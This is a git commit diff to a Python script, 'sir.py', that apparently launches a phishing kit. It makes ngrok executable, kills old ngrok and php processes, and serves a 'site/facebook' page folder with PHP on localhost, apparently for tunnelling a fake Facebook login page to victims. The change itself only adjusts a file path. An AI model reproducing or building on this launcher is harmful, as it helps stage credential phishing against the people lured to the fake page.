d27ecec0bc40bffcefe043d4d6e77f96e6db6fb7
ABIRHOSSAIN10 <84902162+ABIRHOSSAIN10@users.noreply.github.com>
2021-08-23 15:13:20 +0600

    Update sir.py

--- sir.py
+++ sir.py
@@ -1,5 +1,5 @@
 import os,json,time
-os.system("chmod +x ngrok*")
+os.system("chmod +x Abir/ngrok*")
 os.system("killall ngrok> /dev/null 2>&1 || killall ngrok> /dev/null 2>&1")
 os.system("killall php> /dev/null 2>&1")
 os.system("cd site/facebook/ && php -S 127.0.0.1:8080> /dev/null 2>&1 &")
